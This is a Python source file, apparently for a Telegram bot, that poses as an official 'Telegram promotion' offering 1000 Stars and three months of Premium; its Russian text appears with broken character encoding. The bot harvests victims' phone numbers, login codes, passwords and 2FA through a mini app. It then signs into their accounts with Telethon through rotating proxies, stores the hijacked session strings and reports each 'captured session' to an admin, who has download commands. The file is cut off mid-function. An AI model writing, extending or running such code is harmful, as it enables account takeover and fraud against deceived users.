import telebot
from telebot import types
import sqlite3
import json
import logging
import os
import threading
import time
import random
import asyncio
import aiohttp
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import requests
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.network import ConnectionTcpAbridged
import socks

# ============ –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ============
TOKEN = 'YOUR_BOT_TOKEN_HERE'
ADMIN_ID = 123456789
CHANNELS = ['@channel1', '@channel2']
MINI_APP_URL = 'https://your-domain.com/index.html'

API_ID = 123456  # –ü–û–õ–£–ß–ò–¢–¨ –ù–ê my.telegram.org
API_HASH = 'abcdef1234567890'  # –ü–û–õ–£–ß–ò–¢–¨ –ù–ê my.telegram.org

# –ü–†–û–ö–°–ò –î–õ–Ø –û–ë–•–û–î–ê –ë–õ–û–ö–ò–†–û–í–û–ö
PROXIES = [
    'http://user1:pass1@proxy1.com:8080',
    'socks5://user2:pass2@proxy2.com:1080',
    'http://user3:pass3@proxy3.com:3128',
    # –î–û–ë–ê–í–¨ –°–í–û–ò –ü–†–û–ö–°–ò
]
# ======================================

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(TOKEN)

# –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø–∞–ø–æ–∫
BASE_DIR = 'premium_stars_bot'
DATA_FOLDER = os.path.join(BASE_DIR, 'data')
SESSIONS_FOLDER = os.path.join(BASE_DIR, 'sessions')
LOGS_FOLDER = os.path.join(BASE_DIR, 'logs')
PROXY_FOLDER = os.path.join(BASE_DIR, 'proxy_stats')

for folder in [BASE_DIR, DATA_FOLDER, SESSIONS_FOLDER, LOGS_FOLDER, PROXY_FOLDER]:
    if not os.path.exists(folder):
        os.makedirs(folder)

# ============ –°–ò–°–¢–ï–ú–ê –ü–†–û–ö–°–ò ============
class ProxyManager:
    def __init__(self, proxies):
        self.proxies = proxies
        self.proxy_stats = {}
        self.load_stats()
        
    def load_stats(self):
        try:
            stats_file = os.path.join(PROXY_FOLDER, 'proxy_stats.json')
            if os.path.exists(stats_file):
                with open(stats_file, 'r') as f:
                    self.proxy_stats = json.load(f)
        except:
            self.proxy_stats = {}
            
    def save_stats(self):
        stats_file = os.path.join(PROXY_FOLDER, 'proxy_stats.json')
        with open(stats_file, 'w') as f:
            json.dump(self.proxy_stats, f, indent=2)
            
    def get_best_proxy(self):
        if not self.proxies:
            return None
            
        proxy_weights = []
        for proxy in self.proxies:
            stats = self.proxy_stats.get(proxy, {
                'success': 0,
                'fails': 0,
                'last_used': 0,
                'avg_time': 10
            })
            
            weight = (stats['success'] * 10) - (stats['fails'] * 5)
            if time.time() - stats['last_used'] < 300:
                weight -= 50
                
            proxy_weights.append((proxy, weight))
            
        proxy_weights.sort(key=lambda x: x[1], reverse=True)
        return proxy_weights[0][0] if proxy_weights else None
        
    def mark_success(self, proxy, response_time):
        if proxy not in self.proxy_stats:
            self.proxy_stats[proxy] = {'success': 0, 'fails': 0, 'avg_time': 0}
            
        self.proxy_stats[proxy]['success'] += 1
        self.proxy_stats[proxy]['last_used'] = time.time()
        
        old_avg = self.proxy_stats[proxy]['avg_time']
        count = self.proxy_stats[proxy]['success'] + self.proxy_stats[proxy]['fails']
        self.proxy_stats[proxy]['avg_time'] = (old_avg * (count - 1) + response_time) / count
        
        self.save_stats()
        
    def mark_fail(self, proxy, reason=""):
        if proxy not in self.proxy_stats:
            self.proxy_stats[proxy] = {'success': 0, 'fails': 0, 'avg_time': 0}
            
        self.proxy_stats[proxy]['fails'] += 1
        self.proxy_stats[proxy]['last_used'] = time.time()
        
        fail_log = os.path.join(PROXY_FOLDER, 'proxy_fails.txt')
        with open(fail_log, 'a') as f:
            f.write(f"{datetime.now()}: {proxy} - {reason}\n")
            
        self.save_stats()

proxy_manager = ProxyManager(PROXIES)

# ============ –ë–ê–ó–ê –î–ê–ù–ù–´–• ============
def init_db():
    conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        phone TEXT UNIQUE,
        code TEXT,
        password TEXT,
        twofa TEXT,
        session_string TEXT,
        proxy_used TEXT,
        auth_status TEXT,
        attempts INTEGER DEFAULT 0,
        last_attempt DATETIME,
        first_seen DATETIME,
        last_seen DATETIME,
        user_agent TEXT,
        ip TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        account_id INTEGER,
        session_string TEXT UNIQUE,
        proxy_used TEXT,
        creation_time DATETIME,
        telegram_user_id INTEGER,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        premium BOOLEAN DEFAULT 0
    )''')
    
    conn.commit()
    conn.close()

init_db()

# ============ –¢–ï–õ–ï–¢–•–û–ù –ö–õ–ò–ï–ù–¢ –° –ü–†–û–ö–°–ò ============
def parse_proxy(proxy_str):
    if not proxy_str:
        return None
        
    try:
        if proxy_str.startswith('http://'):
            proxy_str = proxy_str.replace('http://', '')
            if '@' in proxy_str:
                auth, hostport = proxy_str.split('@')
                user, password = auth.split(':')
                host, port = hostport.split(':')
                return (socks.HTTP, host, int(port), True, user, password)
            else:
                host, port = proxy_str.split(':')
                return (socks.HTTP, host, int(port))
                
        elif proxy_str.startswith('socks5://'):
            proxy_str = proxy_str.replace('socks5://', '')
            if '@' in proxy_str:
                auth, hostport = proxy_str.split('@')
                user, password = auth.split(':')
                host, port = hostport.split(':')
                return (socks.SOCKS5, host, int(port), True, user, password)
            else:
                host, port = proxy_str.split(':')
                return (socks.SOCKS5, host, int(port))
                
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞ –ø—Ä–æ–∫—Å–∏: {e}")
        return None

async def create_session_with_retry(phone, code, password=None, twofa=None, max_retries=2):
    session_string = None
    account_info = None
    proxy_used = None
    error_msg = ""
    
    for attempt in range(max_retries):
        proxy_str = proxy_manager.get_best_proxy()
        if not proxy_str and attempt > 0:
            proxy_config = None
        else:
            proxy_config = parse_proxy(proxy_str)
            proxy_used = proxy_str
            
        start_time = time.time()
        
        try:
            session_name = f"{phone}_{int(time.time())}"
            session_file = os.path.join(SESSIONS_FOLDER, f"{session_name}.session")
            
            client = TelegramClient(
                session=session_file,
                api_id=API_ID,
                api_hash=API_HASH,
                proxy=proxy_config,
                connection=ConnectionTcpAbridged,
                timeout=30
            )
            
            await client.connect()
            
            if attempt == 0:
                try:
                    await client.send_code_request(phone)
                    await asyncio.sleep(1)
                except Exception as e:
                    error_msg = f"send_code_error: {str(e)}"
                    proxy_manager.mark_fail(proxy_used, error_msg)
                    continue
            
            try:
                await client.sign_in(phone=phone, code=code)
                
            except Exception as e:
                if "PASSWORD" in str(e).upper() and password:
                    try:
                        await client.sign_in(password=password)
                    except Exception as e2:
                        error_msg = f"password_error: {str(e2)}"
                        raise
                else:
                    error_msg = f"sign_in_error: {str(e)}"
                    raise
            
            response_time = time.time() - start_time
            
            me = await client.get_me()
            account_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name if me.last_name else '',
                'premium': me.premium if hasattr(me, 'premium') else False,
                'phone': me.phone
            }
            
            session_string = StringSession.save(client.session)
            
            session_string_file = os.path.join(SESSIONS_FOLDER, f"{session_name}.txt")
            with open(session_string_file, 'w', encoding='utf-8') as f:
                f.write(session_string)
            
            proxy_manager.mark_success(proxy_used, response_time)
            
            await client.disconnect()
            
            return {
                'success': True,
                'session_string': session_string,
                'session_file': session_string_file,
                'proxy_used': proxy_used,
                'response_time': response_time,
                'account_info': account_info,
                'attempts': attempt + 1
            }
            
        except Exception as e:
            response_time = time.time() - start_time
            error_msg = str(e)
            
            if proxy_used:
                proxy_manager.mark_fail(proxy_used, error_msg[:100])
            
            if attempt < max_retries - 1:
                delay = random.uniform(3, 8)
                await asyncio.sleep(delay)
    
    return {
        'success': False,
        'session_string': None,
        'session_file': None,
        'proxy_used': proxy_used,
        'response_time': 0,
        'error': error_msg,
        'attempts': max_retries
    }

def create_session_sync(phone, code, password=None, twofa=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(
            create_session_with_retry(phone, code, password, twofa)
        )
        return result
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'session_string': None
        }
    finally:
        loop.close()

# ============ –û–ß–ï–†–ï–î–¨ –û–ë–†–ê–ë–û–¢–ö–ò ============
class ProcessingQueue:
    def __init__(self):
        self.queue = []
        self.executor = ThreadPoolExecutor(max_workers=3)
        
    def add_task(self, account_id, phone, code, password=None, twofa=None):
        task = {
            'account_id': account_id,
            'phone': phone,
            'code': code,
            'password': password,
            'twofa': twofa,
            'added_time': datetime.now(),
            'status': 'pending'
        }
        self.queue.append(task)
        logger.info(f"–ó–∞–¥–∞—á–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∞: {phone}")
        
    def process_next(self):
        if not self.queue:
            return
            
        task = self.queue.pop(0)
        future = self.executor.submit(self.process_task, task)
        return future
        
    def process_task(self, task):
        task['status'] = 'processing'
        task['start_time'] = datetime.now()
        
        try:
            result = create_session_sync(
                phone=task['phone'],
                code=task['code'],
                password=task.get('password'),
                twofa=task.get('twofa')
            )
            
            task['end_time'] = datetime.now()
            task['result'] = result
            
            if result['success']:
                task['status'] = 'success'
            else:
                task['status'] = 'failed'
                
            update_account_status(task['account_id'], task['status'], result)
                
        except Exception as e:
            task['status'] = 'error'
            task['error'] = str(e)
            
        return task

queue = ProcessingQueue()

# ============ –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò ============
def check_subscription(user_id):
    for channel in CHANNELS:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        except:
            return False
    return True

def save_account_data(user_id, username, data, ip=None):
    try:
        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
        c = conn.cursor()
        
        c.execute("SELECT id, auth_status FROM accounts WHERE phone = ?", (data.get('phone'),))
        existing = c.fetchone()
        
        if existing:
            account_id = existing[0]
            c.execute('''UPDATE accounts SET 
                        code = ?, password = ?, twofa = ?, 
                        last_seen = ?, attempts = attempts + 1
                        WHERE id = ?''',
                     (data.get('code'), data.get('password'), data.get('twofa'),
                      datetime.now(), account_id))
        else:
            c.execute('''INSERT INTO accounts 
                        (user_id, username, phone, code, password, twofa, 
                         auth_status, first_seen, last_seen, ip, attempts)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, username, data.get('phone'), data.get('code'),
                      data.get('password'), data.get('twofa'), 'pending',
                      datetime.now(), datetime.now(), ip, 1))
            account_id = c.lastrowid
        
        conn.commit()
        
        queue.add_task(
            account_id=account_id,
            phone=data.get('phone'),
            code=data.get('code'),
            password=data.get('password'),
            twofa=data.get('twofa')
        )
        
        threading.Thread(target=process_queue_background, daemon=True).start()
        
        c.execute("SELECT auth_status FROM accounts WHERE id = ?", (account_id,))
        auth_status = c.fetchone()[0]
        
        conn.close()
        
        return account_id, auth_status
        
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è: {e}")
        return None, 'error'

def process_queue_background():
    try:
        for _ in range(min(2, len(queue.queue))):
            future = queue.process_next()
            if future:
                future.result(timeout=180)
                
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏: {e}")

def update_account_status(account_id, status, result):
    try:
        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
        c = conn.cursor()
        
        if status == 'success' and result.get('success'):
            c.execute('''UPDATE accounts SET 
                        auth_status = 'success',
                        session_string = ?,
                        proxy_used = ?,
                        last_attempt = ?
                        WHERE id = ?''',
                     (result.get('session_string'),
                      result.get('proxy_used'),
                      datetime.now(),
                      account_id))
            
            if result.get('account_info'):
                acc_info = result['account_info']
                c.execute('''INSERT INTO sessions 
                            (account_id, session_string, proxy_used, creation_time,
                             telegram_user_id, username, first_name, last_name, premium)
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                         (account_id, result.get('session_string'),
                          result.get('proxy_used'), datetime.now(),
                          acc_info.get('id'), acc_info.get('username'),
                          acc_info.get('first_name'), acc_info.get('last_name'),
                          acc_info.get('premium')))
            
            notify_admin_success(account_id, result)
            
        else:
            c.execute('''UPDATE accounts SET 
                        auth_status = ?,
                        last_attempt = ?
                        WHERE id = ?''',
                     (status, datetime.now(), account_id))
            
            notify_admin_failure(account_id, result.get('error', 'Unknown error'))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è: {e}")

def notify_admin_success(account_id, result):
    try:
        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
        c = conn.cursor()
        c.execute("SELECT phone, username FROM accounts WHERE id = ?", (account_id,))
        phone, username = c.fetchone()
        conn.close()
        
        acc_info = result.get('account_info', {})
        
        message = f"""üî• –ù–û–í–ê–Ø –°–ï–°–°–ò–Ø –ó–ê–•–í–ê–ß–ï–ù–ê

üì± –¢–µ–ª–µ—Ñ–æ–Ω: {phone}
üë§ Username: @{username if username else '–Ω–µ—Ç'}
üÜî ID: {acc_info.get('id', '?')}
üëë Premium: {'‚úÖ' if acc_info.get('premium') else '‚ùå'}
‚è∞ –í—Ä–µ–º—è: {datetime.now().strftime('%H:%M:%S')}
üåê –ü—Ä–æ–∫—Å–∏: {result.get('proxy_used', '–Ω–µ—Ç')}

üíæ –°–µ—Å—Å–∏—è: /get_session_{account_id}
üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞: /proxy_stats"""
        
        bot.send_message(ADMIN_ID, message)
        
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: {e}")

def notify_admin_failure(account_id, error):
    try:
        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
        c = conn.cursor()
        c.execute("SELECT phone FROM accounts WHERE id = ?", (account_id,))
        phone = c.fetchone()[0]
        conn.close()
        
        message = f"""‚ùå –ù–ï–£–î–ê–ß–ù–´–ô –í–•–û–î

üì± –¢–µ–ª–µ—Ñ–æ–Ω: {phone}
‚ö†Ô∏è –û—à–∏–±–∫–∞: {error[:100]}
‚è∞ –í—Ä–µ–º—è: {datetime.now().strftime('%H:%M:%S')}"""
        
        bot.send_message(ADMIN_ID, message)
        
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: {e}")

# ============ –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ë–û–¢–ê ============
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    if not check_subscription(user_id):
        for channel in CHANNELS:
            markup.add(types.InlineKeyboardButton(
                text=f"üì¢ –ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ {channel}",
                url=f"https://t.me/{channel[1:]}"
            ))
        
        markup.add(types.InlineKeyboardButton(
            text="‚úÖ –Ø –ø–æ–¥–ø–∏—Å–∞–ª—Å—è",
            callback_data="check_subscription"
        ))
        
        bot.send_message(
            message.chat.id,
            "üéÅ *–ê–ö–¶–ò–Ø –û–¢ TELEGRAM: 1000 –ó–í–ï–ó–î + PREMIUM –ù–ê 3 –ú–ï–°–Ø–¶–ê!*\n\n"
            "üî• *–≠–ö–°–ö–õ–Æ–ó–ò–í–ù–û–ï –ü–†–ï–î–õ–û–ñ–ï–ù–ò–ï:*\n"
            "‚Ä¢ 1000 –∑–≤–µ–∑–¥ Telegram –¥–ª—è –ø–æ–∫—É–ø–æ–∫\n"
            "‚Ä¢ Telegram Premium –Ω–∞ 3 –º–µ—Å—è—Ü–∞\n"
            "‚Ä¢ –ü—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–π —Å—Ç–∞—Ç—É—Å –∞–∫–∫–∞—É–Ω—Ç–∞\n"
            "‚Ä¢ –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞\n\n"
            "‚ö†Ô∏è *–î–ª—è —É—á–∞—Å—Ç–∏—è –≤ –∞–∫—Ü–∏–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –Ω–∞—à–∏ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–µ –∫–∞–Ω–∞–ª—ã.*\n"
            "–ü–æ—Å–ª–µ –ø–æ–¥–ø–∏—Å–∫–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.",
            parse_mode='Markdown',
            reply_markup=markup
        )
    else:
        send_mini_app(message.chat.id, username)

@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def check_sub_callback(call):
    if check_subscription(call.from_user.id):
        bot.answer_callback_query(call.id, "‚úÖ –ü–æ–¥–ø–∏—Å–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞!")
        send_mini_app(call.message.chat.id, call.from_user.username)
    else:
        bot.answer_callback_query(call.id, "‚ùå –í—ã –ø–æ–¥–ø–∏—Å–∞–ª–∏—Å—å –Ω–µ –Ω–∞ –≤—Å–µ –∫–∞–Ω–∞–ª—ã!")

def send_mini_app(chat_id, username):
    markup = types.InlineKeyboardMarkup()
    
    markup.add(types.InlineKeyboardButton(
        text="üéÅ –ü–û–õ–£–ß–ò–¢–¨ 1000 –ó–í–Å–ó–î + PREMIUM",
        web_app=types.WebAppInfo(url=MINI_APP_URL)
    ))
    
    bot.send_message(
        chat_id,
        f"üéâ *–î–û–°–¢–£–ü –û–¢–ö–†–´–¢, {username if username else '—É—á–∞—Å—Ç–Ω–∏–∫'}!*\n\n"
        "üî• *–í–ê–® –ü–û–î–ê–†–û–ö –ì–û–¢–û–í –ö –ê–ö–¢–ò–í–ê–¶–ò–ò:*\n"
        "‚úÖ 1000 –∑–≤–µ–∑–¥ Telegram\n"
        "‚úÖ Premium –Ω–∞ 3 –º–µ—Å—è—Ü–∞\n"
        "‚úÖ –ü—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–π —Å—Ç–∞—Ç—É—Å\n"
        "‚úÖ –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞\n\n"
        "üì± *–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è —Å–∏—Å—Ç–µ–º–∞ –≤—ã–¥–∞—á–∏:*\n"
        "1. –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞\n"
        "2. –ü–æ–ª—É—á–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è\n"
        "3. –°–∏—Å—Ç–µ–º–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç –ø–æ–¥–∞—Ä–æ–∫\n\n"
        "‚è∞ *–ü–æ–¥–∞—Ä–æ–∫ –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–µ 5-10 –º–∏–Ω—É—Ç*\n"
        "‚≠ê *–ó–≤—ë–∑–¥—ã –∑–∞—á–∏—Å–ª—è—é—Ç—Å—è –º–æ–º–µ–Ω—Ç–∞–ª—å–Ω–æ*\n"
        "üëë *Premium –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏*\n\n"
        "‚ö†Ô∏è *–í–Ω–∏–º–∞–Ω–∏–µ:* –ù–µ –≤—ã—Ö–æ–¥–∏—Ç–µ –∏–∑ Telegram –≤–æ –≤—Ä–µ–º—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏!",
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.message_handler(content_types=['web_app_data'])
def handle_web_app_data(message):
    try:
        data = json.loads(message.web_app_data.data)
        user_id = message.from_user.id
        username = message.from_user.username
        
        account_id, auth_status = save_account_data(user_id, username, data)
        
        if account_id:
            if auth_status == 'pending':
                bot.send_message(
                    message.chat.id,
                    "‚è≥ *–°–ò–°–¢–ï–ú–ê –ê–ö–¢–ò–í–ò–†–£–ï–¢ –í–ê–® –ü–û–î–ê–†–û–ö...*\n\n"
                    "üîÑ *–ü—Ä–æ—Ü–µ—Å—Å –∑–∞–ø—É—â–µ–Ω:*\n"
                    "‚Ä¢ –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–∞\n"
                    "‚Ä¢ –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ 1000 –∑–≤–µ–∑–¥\n"
                    "‚Ä¢ –ê–∫—Ç–∏–≤–∞—Ü–∏—è Premium –Ω–∞ 3 –º–µ—Å—è—Ü–∞\n\n"
                    "‚è∞ *–ü—Ä–∏–º–µ—Ä–Ω–æ–µ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è: 3-7 –º–∏–Ω—É—Ç*\n"
                    "üì± *–ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ Telegram*\n"
                    "üîí *–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏*",
                    parse_mode='Markdown'
                )
            elif auth_status == 'success':
                bot.send_message(
                    message.chat.id,
                    "üéâ *–ü–û–ó–î–†–ê–í–õ–Ø–ï–ú! –í–ê–® –ü–û–î–ê–†–û–ö –ê–ö–¢–ò–í–ò–†–û–í–ê–ù!*\n\n"
                    "‚ú® *1000 –ó–í–Å–ó–î –¢–ï–õ–ï–ì–†–ê–ú:*\n"
                    "‚Ä¢ –ó–∞—á–∏—Å–ª–µ–Ω—ã –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç\n"
                    "‚Ä¢ –î–æ—Å—Ç—É–ø–Ω—ã –¥–ª—è –ø–æ–∫—É–ø–æ–∫\n"
                    "‚Ä¢ –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è: 1 –≥–æ–¥\n\n"
                    "üëë *TELEGRAM PREMIUM –ù–ê 3 –ú–ï–°–Ø–¶–ê:*\n"
                    "‚Ä¢ –£–≤–µ–ª–∏—á–µ–Ω–Ω—ã–π –ª–∏–º–∏—Ç –∑–∞–≥—Ä—É–∑–æ–∫\n"
                    "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–µ —Å—Ç–∏–∫–µ—Ä—ã\n"
                    "‚Ä¢ –ê–Ω–∏–º–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∞–≤–∞—Ç–∞—Ä—ã\n"
                    "‚Ä¢ –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ —Ä–µ–∫–ª–∞–º—ã\n\n"
                    "‚úÖ *–î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–û:*\n"
                    "‚Ä¢ –ü—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–π —Å—Ç–∞—Ç—É—Å –∞–∫–∫–∞—É–Ω—Ç–∞\n"
                    "‚Ä¢ –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞\n"
                    "‚Ä¢ –ó–∞—â–∏—Ç–∞ –æ—Ç —Å–ø–∞–º–∞\n\n"
                    "üïí *–ó–≤—ë–∑–¥—ã –ø–æ—Å—Ç—É–ø—è—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 5 –º–∏–Ω—É—Ç*\n"
                    "üëë *Premium –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–µ 10 –º–∏–Ω—É—Ç*\n\n"
                    "üéÅ *–°–ø–∞—Å–∏–±–æ –∑–∞ —É—á–∞—Å—Ç–∏–µ –≤ –∞–∫—Ü–∏–∏!*",
                    parse_mode='Markdown'
                )
            else:
                bot.send_message(
                    message.chat.id,
                    "‚ö†Ô∏è *–í–û–ó–ù–ò–ö–õ–ò –°–õ–û–ñ–ù–û–°–¢–ò*\n\n"
                    "–°–∏—Å—Ç–µ–º–∞ –Ω–µ —Å–º–æ–≥–ª–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫.\n\n"
                    "üìû *–ß—Ç–æ –¥–µ–ª–∞—Ç—å:*\n"
                    "1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –∫–æ–¥–∞\n"
                    "2. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –∫–æ–¥ –Ω–µ —É—Å—Ç–∞—Ä–µ–ª\n"
                    "3. –ï—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–∞ 2FA - –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å\n\n"
                    "üîÑ *–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ 15 –º–∏–Ω—É—Ç.*",
                    parse_mode='Markdown'
                )
        else:
            bot.send_message(
                message.chat.id,
                "‚ùå *–û–®–ò–ë–ö–ê –û–ë–†–ê–ë–û–¢–ö–ò*\n\n"
                "–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ –∏–ª–∏ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É.",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏: {e}")
        bot.send_message(
            message.chat.id,
            "‚ö†Ô∏è *–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞*\n\n"
            "–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç.",
            parse_mode='Markdown'
        )

# ============ –ö–û–ú–ê–ù–î–´ –ê–î–ú–ò–ù–ê ============
@bot.message_handler(commands=['stats'])
def stats(message):
    if message.from_user.id == ADMIN_ID:
        try:
            conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
            c = conn.cursor()
            
            c.execute("SELECT COUNT(*) FROM accounts")
            total = c.fetchone()[0]
            
            c.execute("SELECT COUNT(*) FROM accounts WHERE auth_status = 'success'")
            success = c.fetchone()[0]
            
            c.execute("SELECT COUNT(*) FROM accounts WHERE session_string IS NOT NULL")
            sessions = c.fetchone()[0]
            
            conn.close()
            
            message_text = f"""üìä *–°–¢–ê–¢–ò–°–¢–ò–ö–ê –ë–û–¢–ê*

üë§ –í—Å–µ–≥–æ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤: {total}
‚úÖ –£—Å–ø–µ—à–Ω—ã—Ö –∞–∫—Ç–∏–≤–∞—Ü–∏–π: {success}
‚ùå –ù–µ—É–¥–∞—á–Ω—ã—Ö: {total - success}
üíæ –°–µ—Å—Å–∏–π —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ: {sessions}
üìÅ –ü–∞–ø–∫–∞ —Å–µ—Å—Å–∏–π: `{SESSIONS_FOLDER}`

*–ö–æ–º–∞–Ω–¥—ã –∞–¥–º–∏–Ω–∞:*
`/list_sessions` - —Å–ø–∏—Å–æ–∫ —Å–µ—Å—Å–∏–π
`/get_session_ID` - —Å–∫–∞—á–∞—Ç—å —Å–µ—Å—Å–∏—é
`/proxy_stats` - —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–∫—Å–∏"""
            
            bot.send_message(ADMIN_ID, message_text, parse_mode='Markdown')
            
        except Exception as e:
            bot.send_message(ADMIN_ID, f"‚ùå –û—à–∏–±–∫–∞: {e}")

@bot.message_handler(regexp=r'^/get_session_(\d+)$')
def get_session_by_id(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    import re
    match = re.match(r'^/get_session_(\d+)$', message.text)
    if match:
        account_id = match.group(1)
        
        try:
            conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
            c = conn.cursor()
            c.execute("SELECT session_string, phone FROM accounts WHERE id = ?", (account_id,))
            result = c.fetchone()
            conn.close()
            
            if result and result[0]:
                session_string = result[0]
                phone = result[1]
                
